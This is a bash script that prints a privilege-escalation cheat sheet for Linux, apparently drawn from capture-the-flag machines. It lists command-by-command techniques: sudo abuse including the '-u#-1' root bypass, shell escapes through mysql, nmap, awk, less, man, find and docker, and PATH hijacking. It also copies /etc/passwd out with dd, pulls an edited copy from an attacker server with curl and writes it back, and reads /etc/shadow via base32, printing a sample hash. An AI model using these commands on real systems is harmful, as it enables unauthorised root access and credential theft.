#!/bin/bash

function info_privesctec(){

	printf -- "##################################\n"
        printf -- "# PRIVILEGE SCALATION TECHNIQUES #\n"
        printf -- "##################################\n"
        printf -- "# SUDO ABUSE #\n"
        printf -- "############################################################\n"
        printf -- "# sudo -l     will list program that have sudo permissions #\n"
        printf -- "#                                                          #\n"
        printf -- "############################################################\n"
        printf -- "# IF CURRENT USER (example Rajasimha) HAVE IN sudo -l #\n"
        printf -- "# (ALL , !root) /bin/bash                             #\n"
        printf -- "# YOU CAN MOVE TROUGH THE OTHER USERS TYPING          #\n"
        printf -- "# sudo -i -u <otheruser> /bin/bash                    #\n"
        printf -- "#                                                     #\n"
        printf -- "# IMPORTANT                                           #\n"
        printf -- "# IF CURRENT USER (example Rajasimha) HAVE IN sudo -l #\n"
        printf -- "# (ALL , !root) /bin/bash                             #\n"
        printf -- "# TO GAIN ROOT ACCESS YOU CAN TYPE                    #\n"
        printf -- "# sudo -u#-1 /bin/bash                                #\n"
        printf -- "#-----------------------------------------------------#\n"
        printf -- "# CHMOD CAN RUN AS ROOT?                              #\n"
        printf -- "# sudo -u root chmod ugo+rwx /root                    #\n"
        printf -- "#-----------------------------------------------------#\n"
        printf -- "# User X may run the following commands on machine    #\n"
        printf -- "# (root) NOPASSWD: /usr/bin/mysql                     #\n"
        printf -- "# sudo -u root /usr/bin/mysql -e '\! /bin/bash'       #\n"
        printf -- "#-----------------------------------------------------#\n"
        printf -- "# NMAP INSTALLED?                                     #\n"
        printf -- "# sudo -u root nmap --interactive                     #\n"
        printf -- "# nmap>!sh                                            #\n"
        printf -- "#-----------------------------------------------------#\n"
        printf -- "# AWK COMMAND                                         #\n"
        printf -- "# sudo -u root awk 'BEGIN {system(\"/bin/bash\")}'      #\n"
        printf -- "#-----------------------------------------------------#\n"
        printf -- "# LESS COMMAND - MORE COMMAND WORKS TOO!              #\n"
        printf -- "# sudo -u root less /etc/passwd                       #\n"
        printf -- "# !/bin/bash                                          #\n"
        printf -- "#-----------------------------------------------------#\n"
        printf -- "# MAN COMMAND                                         #\n"
        printf -- "# sudo -u root man /bin/bash                          #\n"
        printf -- "# !/bin/bash                                          #\n"
        printf -- "#-----------------------------------------------------#\n"
        printf -- "# CPULIMIT COMMAND                                    #\n"
        printf -- "# cd /tmp                                             #\n"
        printf -- "# cpulimit -l 100 -f mkdir ignite                     #\n"
        printf -- "# cpulimit -l 100 -f chmod 4755 /usr/bin/bash         #\n"
        printf -- "# cpulimit -l 100 -f cp /usr/bin/bash ignite          #\n"
        printf -- "# cpulimit -l 100 -f chmod +s ignite/bash             #\n"
        printf -- "# ./bash -p                                           #\n"
        printf -- "#                                                     #\n"
        printf -- "# CONCLUSION:   ... ... ...                           #\n"
        printf -- "# If you have some user password and see some program #\n"
        printf -- "# with SUID bit set or ... too other many stuff       #\n"
        printf -- "#                                                     #\n"
        printf -- "# and pop and prompt is weird                         #\n"
        printf -- "# like dpkg -l                 :)                     #\n"
        printf -- "#                                                     #\n"
        printf -- "#######################################################\n\n"

        printf -- "#################################\n"
        printf -- "# FIND COMMAND PRIV ESCALATION  #\n"
        printf -- "#############################################\n"
        printf -- "#                                           #\n"
        printf -- "# /usr/bin/find . -exec /bin/sh -p \; -quit #\n"
        printf -- "#                                           #\n"
        printf -- "#############################################\n\n"

        printf -- "#########################\n"
        printf -- "# ID COMMAND AND DOCKER #\n"
        printf -- "########################################################################\n"
        printf -- "# Nothing seems escalable but... look at docker                        #\n"
        printf -- "# uid=1000(minerva) gid=1000(minerva) groups=1000(minerva),115(docker) #\n"
        printf -- "#                                                                      #\n"
        printf -- "# It can be used to break out from restricted environments             #\n"
        printf -- "# by spawning an interactive system shell.                             #\n"
        printf -- "# The resulting is a root shell.                                       #\n"
        printf -- "#                                                                      #\n"
        printf -- "# docker run -v /:/mnt --rm -it alpine chroot /mnt sh                  #\n"
        printf -- "#                                                                      #\n"
        printf -- "# Be patient cause is a bit slow                                       #\n"
        printf -- "# You can find more in https://gtfobins.github.io                      #\n"
        printf -- "########################################################################\n\n"

        printf -- "##############################\n"
        printf -- "# DD COMMAND PRIV ESCALATION #\n"
        printf -- "#########################################################\n"
        printf -- "# if dd command can run as elevated privileged          #\n"
        printf -- "# then we can manipulate or read restricted files       #\n"
        printf -- "# and send it to our server or some                     #\n"
        printf -- "#                                                       #\n"
        printf -- "# dd if=/etc/passwd of=/etc/passwdcopy                  #\n"
        printf -- "#                                                       #\n"
        printf -- "# example:                                              #\n"
        printf -- "# User adam may run the following commands on funbox5:  #\n"
        printf -- "#     (root) PASSWD: /bin/dd                            #\n"
        printf -- "#     (root) PASSWD: /bin/de                            #\n"
        printf -- "#     (root) PASSWD: /bin/df                            #\n"
        printf -- "#                                                       #\n"
        printf -- "# sudo dd if=/etc/passwd of=/var/www/html/passwd        #\n"
        printf -- "#                                                       #\n"
        printf -- "# this command send unreadable /etc/passwd file         #\n"
        printf -- "# to the webserver. We curl the file to our             #\n"
        printf -- "# server, edit file, go target machine again            #\n"
        printf -- "# and use /tmp folder cause have write permissions      #\n"
        printf -- "#                                                       #\n"
        printf -- "# curl http://ourmachine/passwd > /tmp/passwd           #\n"
        printf -- "#                                                       #\n"
        printf -- "# and then                                              #\n"
        printf -- "#                                                       #\n"
        printf -- "# sudo dd if=/tmp/passwd of=/etc/passwd                 #\n"
        printf -- "#                                                       #\n"
        printf -- "# and MAGIC!                                            #\n"
        printf -- "#########################################################\n\n"

        printf -- "######################################################################################\n"
        printf -- "# BASE32 INTERESTING THING TO READ /ETC/SHADOW FILE and then can bruteforce password #\n"
        printf -- "#######################################################################################################################################\n"
        printf -- "# example:                                                                                                                            #\n"
        printf -- "# As www-data see that /usr/bin/base32 have root permissions                                                                          #\n"
        printf -- "# then we can read the content of /etc/shadows and see the                                                                            #\n"
        printf -- "# encrypt password of the user dobby                                                                                                  #\n"
        printf -- "#                                                                                                                                     #\n"
        printf -- "# /usr/bin/base32 /etc/shadow | /usr/bin/base32 -d | grep dobby                                                                       #\n"
        printf -- "#                                                                                                                                     #\n"
        printf -- "# dobby:\$6\$5zBywVON/Qj/78Yb\$ac1hoOn/S/CwZEzl2JZQkKGhkL9N40bV9TJgjF7l3tKSbvGdHrnonYrYfLjF6mwmWrGEojmidvIrrfHEWqSgv.:18573:0:99999:7::: #\n"
        printf -- "#######################################################################################################################################\n\n"

        printf -- "###########################\n"
        printf -- "# ABUSE ENV PATH VARIABLE #\n"
        printf -- "##################################################################\n"
        printf -- "# EXAMPLE FROM:                                                  #\n"
        printf -- "# sudo -l                                                        #\n"
        printf -- "# (root:root)SETENV: /usr/bin/check_syslog.sh                    #\n"
        printf -- "# CONTENT OF CHECK_SYSLOG.sh                                     #\n"
        printf -- "# tail -n 10 /var/log/syslog                                     #\n"
        printf -- "##################################################################\n\n"
        printf -- "##################################################################\n"
        printf -- "# As we know the checklog.sh could be run in preserve            #\n"
        printf -- "# Environment that means we can abuse the environment            #\n"
        printf -- "# path variable. So we tried to make symlinking for vim          #\n"
        printf -- "# editor through the tail,then changed environment               #\n"
        printf -- "# variable. This could be done using the following commands :    #\n"
        printf -- "# ++++++++++++++++++++++++++++++                                 #\n"
        printf -- "# + ln -s /usr/bin/vim tail    +                                 #\n"
        printf -- "# + export PATH=\$(pwd):\$PATH   +                                 #\n"
        printf -- "# ++++++++++++++++++++++++++++++                                 #\n"
        printf -- "#                                                                #\n"
        printf -- "# Once,you will execute above command, further you need          #\n"
        printf -- "# to execute the following command that will execute             #\n"
        printf -- "# check_syslog.sh in a -preserve environment which               #\n"
        printf -- "# will link wim editor to tail program and open the              #\n"
        printf -- "# syslog.sh script in vi editor mode.                            #\n"
        printf -- "#                                                                #\n"
        printf -- "# +++++++++++++++++++++++++++++++++++++++++++++++++++++          #\n"
        printf -- "# + sudo --preserve-env=PATH /usr/bin/check_syslog.sh +          #\n"
        printf -- "# +++++++++++++++++++++++++++++++++++++++++++++++++++++          #\n"
        printf -- "#                                                                #\n"
        printf -- "# Since the script is running as root,take the privileges        #\n"
        printf -- "# of this, modify the content by editing following:              #\n"
        printf -- "#                                                                #\n"
        printf -- "# +++++++++++++++                                                #\n"
        printf -- "# + :!/bin/bash +                                                #\n"
        printf -- "# + Press Enter +                                                #\n"
        printf -- "# +++++++++++++++                                                #\n"
        printf -- "#                                                                #\n"
        printf -- "##################################################################\n\n"

        printf -- "###########################################\n"
        printf -- "# ABUSE ENV PATH VARIABLE OTHER TECHNIQUE #\n"
        printf -- "###########################################\n"
        printf -- "#############\n"
        printf -- "#  SCENARIO #\n"
        printf -- "############################################################\n"
        printf -- "# /usr/bin/sky binary that executes whoami command as root #\n"
        printf -- "############################################################\n"
        printf -- "# +++++++++++++++++++++++++++ #\n"
        printf -- "# + cd /tmp                 + #\n"
        printf -- "# + echo '/bin/sh' > whoami + #\n"
        printf -- "# + chmod 777 whoami        + #\n"
        printf -- "# + export PATH=/tmp:\$PATH  + #\n"
        printf -- "# + /usr/bin/sky            + #\n"
        printf -- "# +++++++++++++++++++++++++++ #\n"
        printf -- "###############################\n\n"


}

info_privesctec
